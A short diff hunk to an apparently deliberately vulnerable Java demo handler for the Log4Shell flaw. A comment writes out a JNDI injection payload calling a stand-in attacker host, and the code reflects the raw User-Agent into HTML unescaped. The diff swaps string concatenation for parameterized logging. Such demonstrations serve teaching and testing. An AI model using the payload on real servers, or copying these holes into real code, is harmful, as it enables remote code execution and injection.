@@ -121,7 +121,7 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
     
     // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
     // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
-    log.info("Request User Agent:" + userAgent);
+    log.info("Request User Agent:{}", userAgent);
 
     String response = "<h1>Hello There, " + userAgent + "!</h1>";
     he.sendResponseHeaders(200, response.length());
